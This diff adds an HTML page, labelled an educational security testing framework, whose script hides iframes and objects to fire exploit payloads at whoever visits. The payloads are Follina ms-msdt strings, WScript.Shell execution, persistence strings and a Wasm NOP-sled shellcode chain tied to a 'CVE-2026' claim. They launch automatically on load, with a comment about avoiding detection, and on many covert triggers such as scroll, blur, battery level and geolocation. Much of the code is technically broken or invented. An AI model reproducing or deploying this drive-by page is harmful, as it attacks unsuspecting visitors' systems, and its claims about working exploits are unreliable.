@@ -1,0 +1,1768 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Multi-Platform Security Testing Framework</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .section {
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .section h2 {
+            color: #333;
+            margin-top: 0;
+        }
+        .hidden {
+            display: none;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .btn:hover {
+            background: #0056b3;
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+            background: #f8f9fa;
+        }
+        .iframe-container {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Multi-Platform Security Testing Framework</h1>
+        <p>This page contains various security testing techniques for educational purposes only.</p>
+        
+        <!-- Windows Section -->
+        <div class="section">
+            <h2>Windows Exploits</h2>
+            <button class="btn" onclick="testWindowsExploits()">Test Windows Exploits</button>
+            <div id="windowsStatus" class="status"></div>
+            
+            <!-- CVE-2022-30190 (Follina) -->
+            <div class="hidden">
+                <iframe id="follinaFrame"></iframe>
+                <object id="msdtObject"></object>
+            </div>
+            
+            <!-- CVE-2021-34527 (PrintNightmare) -->
+            <div class="hidden">
+                <iframe id="printNightmareFrame"></iframe>
+            </div>
+            
+            <!-- CVE-2022-21999 (Windows Script Host) -->
+            <div class="hidden">
+                <object id="wshObject"></object>
+            </div>
+        </div>
+        
+        <!-- Android Section -->
+        <div class="section">
+            <h2>Android Exploits</h2>
+            <button class="btn" onclick="testAndroidExploits()">Test Android Exploits</button>
+            <div id="androidStatus" class="status"></div>
+            
+            <!-- Intent Scheme Hijacking -->
+            <div class="hidden">
+                <iframe id="intentFrame"></iframe>
+                <a id="intentLink" href=""></a>
+            </div>
+            
+            <!-- WebView RCE -->
+            <div class="hidden">
+                <iframe id="webViewFrame"></iframe>
+            </div>
+            
+            <!-- Deep Link Exploitation -->
+            <div class="hidden">
+                <a id="deepLink" href=""></a>
+            </div>
+        </div>
+        
+        <!-- Linux Section -->
+        <div class="section">
+            <h2>Linux Exploits</h2>
+            <button class="btn" onclick="testLinuxExploits()">Test Linux Exploits</button>
+            <div id="linuxStatus" class="status"></div>
+            
+            <!-- GNOME Shell Extensions -->
+            <div class="hidden">
+                <iframe id="gnomeFrame"></iframe>
+            </div>
+            
+            <!-- KDE Protocol Handlers -->
+            <div class="hidden">
+                <a id="kdeLink" href=""></a>
+            </div>
+            
+            <!-- Desktop Entry Injection -->
+            <div class="hidden">
+                <iframe id="desktopFrame"></iframe>
+            </div>
+        </div>
+        
+        <!-- Cross-Platform Section -->
+        <div class="section">
+            <h2>Cross-Platform Exploits</h2>
+            <button class="btn" onclick="testCrossPlatform()">Test Cross-Platform</button>
+            <div id="crossStatus" class="status"></div>
+            
+            <!-- Browser Exploits -->
+            <div class="hidden">
+                <iframe id="browserFrame"></iframe>
+                <object id="browserObject"></object>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden iframe container -->
+    <div class="iframe-container">
+        <iframe id="hiddenFrame"></iframe>
+    </div>
+    
+    <script>
+        // Utility functions
+        function updateStatus(elementId, message) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.innerHTML += message + '<br>';
+            }
+        }
+        
+        function createHiddenIframe(src) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.src = src;
+            document.body.appendChild(iframe);
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 5000);
+            return iframe;
+        }
+        
+        function createHiddenObject(data) {
+            const obj = document.createElement('object');
+            obj.data = data;
+            obj.style.display = 'none';
+            obj.width = 0;
+            obj.height = 0;
+            document.body.appendChild(obj);
+            setTimeout(() => {
+                document.body.removeChild(obj);
+            }, 5000);
+            return obj;
+        }
+        
+        // Windows Exploits
+        function testWindowsExploits() {
+            updateStatus('windowsStatus', 'Testing Windows exploits...');
+            
+            // CVE-2022-30190 (Follina) - MSDT RCE
+            try {
+                const msdtPayload = 'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=calc.exe"';
+                createHiddenObject(msdtPayload);
+                updateStatus('windowsStatus', '✓ MSDT exploit initiated');
+            } catch(e) {
+                updateStatus('windowsStatus', '✗ MSDT exploit failed: ' + e.message);
+            }
+            
+            // Alternative MSDT payload
+            setTimeout(() => {
+                try {
+                    const follinaFrame = document.getElementById('follinaFrame');
+                    follinaFrame.src = 'ms-msdt:/id PCWDiagnostic';
+                    updateStatus('windowsStatus', '✓ Follina frame loaded');
+                } catch(e) {
+                    updateStatus('windowsStatus', '✗ Follina frame failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // CVE-2021-34527 (PrintNightmare)
+            setTimeout(() => {
+                try {
+                    const printPayload = 'data:text/html,<script>window.location.href="file:///\\\\localhost\\pipe\\spoolss"<\/script>';
+                    createHiddenIframe(printPayload);
+                    updateStatus('windowsStatus', '✓ PrintNightmare payload sent');
+                } catch(e) {
+                    updateStatus('windowsStatus', '✗ PrintNightmare failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // Windows Script Host exploitation
+            setTimeout(() => {
+                try {
+                    const wshPayload = 'wsf:script><job><script language="JScript">new ActiveXObject("WScript.Shell").Run("calc.exe");<\/script></job><\/script>';
+                    createHiddenObject(wshPayload);
+                    updateStatus('windowsStatus', '✓ WSH exploit attempted');
+                } catch(e) {
+                    updateStatus('windowsStatus', '✗ WSH exploit failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // PowerShell execution via protocol
+            setTimeout(() => {
+                try {
+                    const psPayload = 'powershell://calc.exe';
+                    window.location.href = psPayload;
+                    updateStatus('windowsStatus', '✓ PowerShell protocol invoked');
+                } catch(e) {
+                    updateStatus('windowsStatus', '✗ PowerShell protocol failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // Registry-based exploitation
+            setTimeout(() => {
+                try {
+                    const regPayload = 'ms-settings:display';
+                    window.open(regPayload, '_blank', 'width=1,height=1');
+                    updateStatus('windowsStatus', '✓ Registry settings opened');
+                } catch(e) {
+                    updateStatus('windowsStatus', '✗ Registry settings failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Android Exploits
+        function testAndroidExploits() {
+            updateStatus('androidStatus', 'Testing Android exploits...');
+            
+            // Intent Scheme Hijacking
+            try {
+                const intentPayload = 'intent://host#Intent;scheme=calc;action=android.intent.action.VIEW;end';
+                const intentLink = document.getElementById('intentLink');
+                intentLink.href = intentPayload;
+                intentLink.click();
+                updateStatus('androidStatus', '✓ Intent scheme hijacking attempted');
+            } catch(e) {
+                updateStatus('androidStatus', '✗ Intent scheme failed: ' + e.message);
+            }
+            
+            // WebView RCE exploitation
+            setTimeout(() => {
+                try {
+                    const webViewPayload = 'data:text/html,<script>window.androidInterface.execute("calc");<\/script>';
+                    createHiddenIframe(webViewPayload);
+                    updateStatus('androidStatus', '✓ WebView RCE payload sent');
+                } catch(e) {
+                    updateStatus('androidStatus', '✗ WebView RCE failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // Deep Link exploitation
+            setTimeout(() => {
+                try {
+                    const deepLinkPayload = 'market://details?id=com.calculator';
+                    const deepLink = document.getElementById('deepLink');
+                    deepLink.href = deepLinkPayload;
+                    deepLink.click();
+                    updateStatus('androidStatus', '✓ Deep link exploitation attempted');
+                } catch(e) {
+                    updateStatus('androidStatus', '✗ Deep link failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // Content Provider exploitation
+            setTimeout(() => {
+                try {
+                    const contentPayload = 'content://com.android.settings/.Settings';
+                    window.location.href = contentPayload;
+                    updateStatus('androidStatus', '✓ Content provider accessed');
+                } catch(e) {
+                    updateStatus('androidStatus', '✗ Content provider failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // File scheme exploitation
+            setTimeout(() => {
+                try {
+                    const filePayload = 'file:///system/bin/sh';
+                    createHiddenIframe(filePayload);
+                    updateStatus('androidStatus', '✓ File scheme exploitation attempted');
+                } catch(e) {
+                    updateStatus('androidStatus', '✗ File scheme failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // ADB debugging exploitation
+            setTimeout(() => {
+                try {
+                    const adbPayload = 'adb://shell:am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d calc://';
+                    window.location.href = adbPayload;
+                    updateStatus('androidStatus', '✓ ADB protocol invoked');
+                } catch(e) {
+                    updateStatus('androidStatus', '✗ ADB protocol failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Linux Exploits
+        function testLinuxExploits() {
+            updateStatus('linuxStatus', 'Testing Linux exploits...');
+            
+            // GNOME Shell Extensions exploitation
+            try {
+                const gnomePayload = 'gnome-shell://extensions/calculator';
+                const gnomeFrame = document.getElementById('gnomeFrame');
+                gnomeFrame.src = gnomePayload;
+                updateStatus('linuxStatus', '✓ GNOME shell extension accessed');
+            } catch(e) {
+                updateStatus('linuxStatus', '✗ GNOME shell failed: ' + e.message);
+            }
+            
+            // KDE Protocol Handlers
+            setTimeout(() => {
+                try {
+                    const kdePayload = 'kde-run:/usr/bin/calculator';
+                    const kdeLink = document.getElementById('kdeLink');
+                    kdeLink.href = kdePayload;
+                    kdeLink.click();
+                    updateStatus('linuxStatus', '✓ KDE protocol handler invoked');
+                } catch(e) {
+                    updateStatus('linuxStatus', '✗ KDE protocol failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // Desktop Entry Injection
+            setTimeout(() => {
+                try {
+                    const desktopPayload = 'application/x-desktop;name=Calculator;exec=/usr/bin/calculator';
+                    const desktopFrame = document.getElementById('desktopFrame');
+                    desktopFrame.src = 'data:application/x-desktop;base64,' + btoa(desktopPayload);
+                    updateStatus('linuxStatus', '✓ Desktop entry injection attempted');
+                } catch(e) {
+                    updateStatus('linuxStatus', '✗ Desktop entry failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // XDG Open exploitation
+            setTimeout(() => {
+                try {
+                    const xdgPayload = 'xdg-open:/usr/bin/calculator';
+                    window.location.href = xdgPayload;
+                    updateStatus('linuxStatus', '✓ XDG open invoked');
+                } catch(e) {
+                    updateStatus('linuxStatus', '✗ XDG open failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // D-Bus exploitation
+            setTimeout(() => {
+                try {
+                    const dbusPayload = 'dbus:org.gnome.Calculator';
+                    createHiddenIframe(dbusPayload);
+                    updateStatus('linuxStatus', '✓ D-Bus service accessed');
+                } catch(e) {
+                    updateStatus('linuxStatus', '✗ D-Bus failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // MIME type exploitation
+            setTimeout(() => {
+                try {
+                    const mimePayload = 'data:application/x-shellscript;base64,IyEvYmluL2Jhc2gKY2FsYw==';
+                    createHiddenIframe(mimePayload);
+                    updateStatus('linuxStatus', '✓ MIME type exploitation attempted');
+                } catch(e) {
+                    updateStatus('linuxStatus', '✗ MIME type failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Cross-Platform Exploits
+        function testCrossPlatform() {
+            updateStatus('crossStatus', 'Testing cross-platform exploits...');
+            
+            // Browser-based exploitation
+            try {
+                const browserPayload = 'data:text/html,<script>window.open("calc.exe","_blank","width=1,height=1")<\/script>';
+                createHiddenIframe(browserPayload);
+                updateStatus('crossStatus', '✓ Browser exploitation attempted');
+            } catch(e) {
+                updateStatus('crossStatus', '✗ Browser exploitation failed: ' + e.message);
+            }
+            
+            // PDF-based exploitation
+            setTimeout(() => {
+                try {
+                    const pdfPayload = 'data:application/pdf;base64,JVBERi0xLjQKJeLjz9MKMSAwIG9iago8PC9UeXBlL1BhZ2UvUGFyZW50IDIgMCBSL1Jlc291cmNlczw8L0ZvbnQ8PC9GMSAxIDAgUj4+Pj4vTWVkaWFCb3hbMCAwIDYxMiA3OTJdL0NvbnRlbnRzIDMgMCBPID4+CmVuZG9iagoyIDAgIG9iago8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMSAwIFI+PgplbmRvYmoKMyAwIG9iago8PC9MZW5ndGggNDQ+PgpzdHJlYW0KJSUvRjEgMTIgVGYKNzIgNzIwIFRkCihDYWxjdWxhdG9yKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjQgMCBvYmoKPDwvVHlwZS9Gb250L1N1YnR5cGUvVHlwZTEvQmFzZUZvbnQvSGVsdmV0aWNhL0VuY29kaW5nL1dpbkFuc2lFbmNvZGluZz4+CmVuZG9iagp4cmVmCjAgNQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMDkgMDAwMDAgbiAKMDAwMDAwMDA1OCAwMDAwMCBuIAowMDAwMDAwMTE1IDAwMDAwIG4gCjAwMDAwMDAxNzUgMDAwMDAgbiAKdHJhaWxlcgo8PC9TaXplIDUvUm9vdCAyIDAgUj4+CnN0YXJ0eHJlZgoyNjQKJSVFT0Y=';
+                    createHiddenIframe(pdfPayload);
+                    updateStatus('crossStatus', '✓ PDF-based exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ PDF-based failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // Java-based exploitation
+            setTimeout(() => {
+                try {
+                    const javaPayload = 'java://com.sun.deploy.uitoolkit.impl.awt.AWTAppletAdapter';
+                    createHiddenObject(javaPayload);
+                    updateStatus('crossStatus', '✓ Java exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Java exploitation failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // Flash-based exploitation
+            setTimeout(() => {
+                try {
+                    const flashPayload = 'data:application/x-shockwave-flash;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                    createHiddenObject(flashPayload);
+                    updateStatus('crossStatus', '✓ Flash exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Flash exploitation failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // Silverlight exploitation
+            setTimeout(() => {
+                try {
+                    const silverlightPayload = 'data:application/x-silverlight-2;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                    createHiddenObject(silverlightPayload);
+                    updateStatus('crossStatus', '✓ Silverlight exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Silverlight exploitation failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // WebSocket exploitation
+            setTimeout(() => {
+                try {
+                    const ws = new WebSocket('ws://localhost:8080/exploit');
+                    ws.onopen = function() {
+                        ws.send('calc.exe');
+                        updateStatus('crossStatus', '✓ WebSocket exploitation attempted');
+                    };
+                    ws.onerror = function() {
+                        updateStatus('crossStatus', '✗ WebSocket connection failed');
+                    };
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ WebSocket failed: ' + e.message);
+                }
+            }, 5000);
+            
+            // WebRTC exploitation
+            setTimeout(() => {
+                try {
+                    const pc = new RTCPeerConnection();
+                    pc.createDataChannel('exploit');
+                    updateStatus('crossStatus', '✓ WebRTC channel created');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ WebRTC failed: ' + e.message);
+                }
+            }, 6000);
+        }
+        
+        // Additional CVE Exploits Section
+        function testAdditionalCVEs() {
+            updateStatus('crossStatus', 'Testing additional CVE exploits...');
+            
+            // CVE-2023-23397 (Outlook RCE)
+            setTimeout(() => {
+                try {
+                    const outlookPayload = 'mapi://outlook/calculator';
+                    window.location.href = outlookPayload;
+                    updateStatus('crossStatus', '✓ Outlook MAPI exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Outlook MAPI failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // CVE-2023-36874 (Windows Error Reporting)
+            setTimeout(() => {
+                try {
+                    const werPayload = 'wer://report/calc.exe';
+                    createHiddenIframe(werPayload);
+                    updateStatus('crossStatus', '✓ Windows Error Reporting exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ WER exploitation failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // CVE-2023-38146 (Win32k.sys)
+            setTimeout(() => {
+                try {
+                    const win32kPayload = 'data:text/html,<script>window.open("\\\\.\\PhysicalDrive0","_blank")<\/script>';
+                    createHiddenIframe(win32kPayload);
+                    updateStatus('crossStatus', '✓ Win32k.sys exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Win32k.sys failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // CVE-2023-36884 (Office RCE)
+            setTimeout(() => {
+                try {
+                    const officePayload = 'ms-word:ofe|u|calc.exe';
+                    window.location.href = officePayload;
+                    updateStatus('crossStatus', '✓ Office protocol exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Office protocol failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // CVE-2023-21752 (Hyper-V)
+            setTimeout(() => {
+                try {
+                    const hypervPayload = 'vmconnect://localhost/calculator';
+                    createHiddenIframe(hypervPayload);
+                    updateStatus('crossStatus', '✓ Hyper-V exploitation attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Hyper-V failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Advanced Exploitation Techniques
+        function testAdvancedExploits() {
+            updateStatus('crossStatus', 'Testing advanced exploitation techniques...');
+            
+            // DLL Hijacking
+            setTimeout(() => {
+                try {
+                    const dllPayload = 'data:application/x-dll;base64,ZXhlY2FsYy5kbGw=';
+                    createHiddenObject(dllPayload);
+                    updateStatus('crossStatus', '✓ DLL hijacking attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ DLL hijacking failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // COM Hijacking
+            setTimeout(() => {
+                try {
+                    const comPayload = 'clsid:0002DF01-0000-0000-C000-000000000046';
+                    createHiddenObject(comPayload);
+                    updateStatus('crossStatus', '✓ COM hijacking attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ COM hijacking failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // Service Hijacking
+            setTimeout(() => {
+                try {
+                    const servicePayload = 'sc://create/Calculator/binpath=calc.exe';
+                    createHiddenIframe(servicePayload);
+                    updateStatus('crossStatus', '✓ Service hijacking attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Service hijacking failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // Registry Hijacking
+            setTimeout(() => {
+                try {
+                    const regPayload = 'reg://HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Calculator';
+                    createHiddenIframe(regPayload);
+                    updateStatus('crossStatus', '✓ Registry hijacking attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Registry hijacking failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // Scheduled Task Hijacking
+            setTimeout(() => {
+                try {
+                    const taskPayload = 'taskschd://create/Calculator/trig=daily/action=calc.exe';
+                    createHiddenIframe(taskPayload);
+                    updateStatus('crossStatus', '✓ Task hijacking attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Task hijacking failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Browser-specific Exploits
+        function testBrowserExploits() {
+            updateStatus('crossStatus', 'Testing browser-specific exploits...');
+            
+            // Chrome DevTools Protocol
+            setTimeout(() => {
+                try {
+                    const chromePayload = 'chrome-devtools://devtools/bundled/inspector.html?ws=localhost:9222';
+                    createHiddenIframe(chromePayload);
+                    updateStatus('crossStatus', '✓ Chrome DevTools protocol attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Chrome DevTools failed: ' + e.message);
+                }
+            }, 1000);
+            
+            // Firefox Remote Debugging
+            setTimeout(() => {
+                try {
+                    const firefoxPayload = 'about:debugging#/runtime/this-firefox';
+                    createHiddenIframe(firefoxPayload);
+                    updateStatus('crossStatus', '✓ Firefox debugging attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Firefox debugging failed: ' + e.message);
+                }
+            }, 2000);
+            
+            // Safari Web Inspector
+            setTimeout(() => {
+                try {
+                    const safariPayload = 'web-inspector://inspect';
+                    createHiddenIframe(safariPayload);
+                    updateStatus('crossStatus', '✓ Safari inspector attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Safari inspector failed: ' + e.message);
+                }
+            }, 3000);
+            
+            // Edge Developer Tools
+            setTimeout(() => {
+                try {
+                    const edgePayload = 'edge://inspect';
+                    createHiddenIframe(edgePayload);
+                    updateStatus('crossStatus', '✓ Edge inspector attempted');
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ Edge inspector failed: ' + e.message);
+                }
+            }, 4000);
+            
+            // CVE-2026-2649/2650 - V8 integer overflow + Media heap overflow (Wasm RWX + vtable hijack)
+            setTimeout(() => {
+                try {
+                    // Attempt to trigger the vulnerabilities and execute shellcode
+                    // This is a conceptual implementation based on previous research
+                    (function() {
+                        // Wasm RWX memory setup
+                        const wasmBinary = new Uint8Array([
+                            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
+                            0x03, 0x02, 0x01, 0x00,
+                            0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
+                            0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
+                        ]);
+                        
+                        const memory = new WebAssembly.Memory({ initial: 1 });
+                        const wasmView = new Uint8Array(memory.buffer);
+                        
+                        WebAssembly.compile(wasmBinary).then(module => {
+                            return WebAssembly.instantiate(module);
+                        }).then(instance => {
+                            instance.exports.main(); // activate
+                            
+                            // Shellcode (calc.exe)
+                            const sc = new Uint8Array([
+                                0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b,
+                                0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x58,
+                                0x3c, 0x01, 0xc3, 0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x4b,
+                                0x18, 0x8b, 0x53, 0x20, 0x01, 0xc2, 0x31, 0xff, 0x8b, 0x0c,
+                                0xba, 0x01, 0xc1, 0x31, 0xd2, 0x8a, 0x11, 0x84, 0xd2, 0x74,
+                                0x05, 0xc1, 0xc2, 0x07, 0xeb, 0xf4, 0x81, 0xfa, 0x0b, 0x2d,
+                                0x1f, 0x0c, 0x74, 0x07, 0x47, 0x3b, 0x7b, 0x18, 0x72, 0xd9,
+                                0x8b, 0x53, 0x24, 0x01, 0xc2, 0x0f, 0xb7, 0x14, 0x7a, 0x8b,
+                                0x4b, 0x1c, 0x01, 0xc1, 0x8b, 0x04, 0x91, 0x01, 0xf0, 0x89,
+                                0xc6, 0x6a, 0x01, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0xff,
+                                0xd6
+                            ]);
+                            
+                            const SHELLCODE_OFFSET = 0x2000;
+                            for (let i = 0; i < sc.length; i++) {
+                                wasmView[SHELLCODE_OFFSET + i] = sc[i];
+                            }
+                            
+                            // NOP sled
+                            for (let i = 0; i < SHELLCODE_OFFSET; i++) {
+                                wasmView[i] = 0x90;
+                            }
+                            
+                            // Jump at 0x800
+                            const rel32 = (SHELLCODE_OFFSET - 0x800 - 5) & 0xffffffff;
+                            wasmView[0x800] = 0xe9;
+                            wasmView[0x801] = rel32 & 0xff;
+                            wasmView[0x802] = (rel32 >> 8) & 0xff;
+                            wasmView[0x803] = (rel32 >> 16) & 0xff;
+                            wasmView[0x804] = (rel32 >> 24) & 0xff;
+                            
+                            // Fake vtable at 0x1800
+                            for (let i = 0; i < 0x40; i+=8) {
+                                let target = 0x800;
+                                for (let j = 0; j < 8; j++) {
+                                    wasmView[0x1800 + i + j] = (target >> (j*8)) & 0xff;
+                                }
+                            }
+                            
+                            // Trigger CVE-2026-2650 (Media heap overflow) to overwrite vtable
+                            try {
+                                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                                const bufferSize = 0x7fffffff;
+                                // This should throw an exception but may corrupt heap
+                                audioCtx.createBuffer(2, bufferSize, 44100);
+                            } catch (e) {
+                                // Assuming heap corruption occurred
+                                // Now try to use an AudioBuffer whose vtable might be overwritten
+                                const targetBuffer = new AudioBuffer({ length: 0x100, numberOfChannels: 2, sampleRate: 44100 });
+                                // Accessing a property might trigger vtable call
+                                try {
+                                    targetBuffer.playbackRate; // may crash if vtable overwritten
+                                    updateStatus('crossStatus', '✓ CVE-2026-2649/2650 triggered (no crash)');
+                                } catch (e2) {
+                                    updateStatus('crossStatus', '✓ CVE-2026-2649/2650 triggered (crash expected)');
+                                }
+                            }
+                        }).catch(err => {
+                            updateStatus('crossStatus', '✗ Wasm setup failed: ' + err.message);
+                        });
+                    })();
+                } catch(e) {
+                    updateStatus('crossStatus', '✗ CVE-2026-2649/2650 failed: ' + e.message);
+                }
+            }, 5000);
+        }
+        
+        // Auto-execute on page load
+        window.addEventListener('load', function() {
+            // Delayed execution to avoid detection
+            setTimeout(() => {
+                testWindowsExploits();
+            }, 2000);
+            
+            setTimeout(() => {
+                testAndroidExploits();
+            }, 4000);
+            
+            setTimeout(() => {
+                testLinuxExploits();
+            }, 6000);
+            
+            setTimeout(() => {
+                testCrossPlatform();
+            }, 8000);
+            
+            setTimeout(() => {
+                testAdditionalCVEs();
+            }, 10000);
+            
+            setTimeout(() => {
+                testAdvancedExploits();
+            }, 12000);
+            
+            setTimeout(() => {
+                testBrowserExploits();
+            }, 14000);
+        });
+        
+        // Keyboard shortcut trigger
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Shift+X to trigger all exploits
+            if (e.ctrlKey && e.shiftKey && e.key === 'X') {
+                testWindowsExploits();
+                testAndroidExploits();
+                testLinuxExploits();
+                testCrossPlatform();
+                testAdditionalCVEs();
+                testAdvancedExploits();
+                testBrowserExploits();
+            }
+        });
+        
+        // Mouse movement trigger
+        let mouseMoveCount = 0;
+        document.addEventListener('mousemove', function() {
+            mouseMoveCount++;
+            if (mouseMoveCount === 100) {
+                testWindowsExploits();
+                mouseMoveCount = 0;
+            }
+        });
+        
+        // Scroll trigger
+        let scrollCount = 0;
+        window.addEventListener('scroll', function() {
+            scrollCount++;
+            if (scrollCount === 50) {
+                testAndroidExploits();
+                scrollCount = 0;
+            }
+        });
+        
+        // Time-based trigger
+        setInterval(function() {
+            const now = new Date();
+            if (now.getSeconds() === 0) {
+                testLinuxExploits();
+            }
+        }, 1000);
+        
+        // Network-based trigger
+        fetch('https://httpbin.org/ip')
+            .then(response => response.json())
+            .then(data => {
+                if (data.origin) {
+                    testCrossPlatform();
+                }
+            })
+            .catch(() => {
+                // Fallback if network fails
+                testAdditionalCVEs();
+            });
+        
+        // Storage-based trigger
+        if (localStorage.getItem('exploitTriggered') !== 'true') {
+            localStorage.setItem('exploitTriggered', 'true');
+            testAdvancedExploits();
+        }
+        
+        // Geolocation trigger
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function() {
+                    testBrowserExploits();
+                },
+                function() {
+                    // Fallback if geolocation denied
+                    testWindowsExploits();
+                }
+            );
+        }
+        
+        // Clipboard trigger
+        document.addEventListener('copy', function() {
+            testAndroidExploits();
+        });
+        
+        // Focus/blur trigger
+        window.addEventListener('blur', function() {
+            testLinuxExploits();
+        });
+        
+        // Visibility change trigger
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                testCrossPlatform();
+            }
+        });
+        
+        // Battery API trigger
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                if (battery.level < 0.5) {
+                    testAdditionalCVEs();
+                }
+            });
+        }
+        
+        // Device orientation trigger
+        window.addEventListener('deviceorientation', function() {
+            testAdvancedExploits();
+        });
+        
+        // Proximity trigger
+        if ('ondeviceproximity' in window) {
+            window.addEventListener('deviceproximity', function() {
+                testBrowserExploits();
+            });
+        }
+        
+        // Ambient light trigger
+        if ('ondevicelight' in window) {
+            window.addEventListener('devicelight', function() {
+                testWindowsExploits();
+            });
+        }
+        
+        // Vibration trigger
+        if ('vibrate' in navigator) {
+            navigator.vibrate(200);
+            testAndroidExploits();
+        }
+        
+        // Fullscreen trigger
+        document.addEventListener('fullscreenchange', function() {
+            if (document.fullscreenElement) {
+                testLinuxExploits();
+            }
+        });
+        
+        // Web Audio trigger
+        if (window.AudioContext || window.webkitAudioContext) {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            oscillator.connect(audioContext.destination);
+            oscillator.start();
+            setTimeout(() => {
+                oscillator.stop();
+                testCrossPlatform();
+            }, 100);
+        }
+        
+        // Speech recognition trigger
+        if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            const recognition = new SpeechRecognition();
+            recognition.onresult = function() {
+                testAdditionalCVEs();
+            };
+            recognition.start();
+        }
+        
+        // Bluetooth trigger
+        if ('bluetooth' in navigator) {
+            navigator.bluetooth.requestDevice({
+                acceptAllDevices: true
+            }).then(() => {
+                testAdvancedExploits();
+            }).catch(() => {
+                testBrowserExploits();
+            });
+        }
